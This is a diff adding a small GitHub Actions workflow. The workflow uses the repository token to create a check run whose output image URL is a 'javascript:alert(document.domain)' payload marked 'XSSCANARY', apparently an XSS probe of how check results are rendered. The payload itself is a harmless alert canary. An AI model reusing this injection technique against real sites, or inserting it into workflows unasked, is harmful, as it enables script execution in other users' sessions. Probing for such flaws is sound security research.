@@ -1,0 +1,20 @@
+name: chk
+on: [push, workflow_dispatch]
+permissions:
+  checks: write
+  contents: read
+jobs:
+  mk:
+    runs-on: ubuntu-latest
+    steps:
+      - name: create check run with javascript: image_url
+        run: |
+          curl -s -X POST \
+            "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/check-runs" \
+            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -d "{\"name\":\"x\",\"head_sha\":\"$GITHUB_SHA\",\"status\":\"completed\",\"conclusion\":\"success\",
+                 \"output\":{\"title\":\"t\",\"summary\":\"s\",
+                 \"images\":[{\"alt\":\"a\",\"image_url\":\"javascript:alert(document.domain)//XSSCANARY\"}]}}" \
+            -o resp.json -w "HTTP %{http_code}\n"
+          cat resp.json
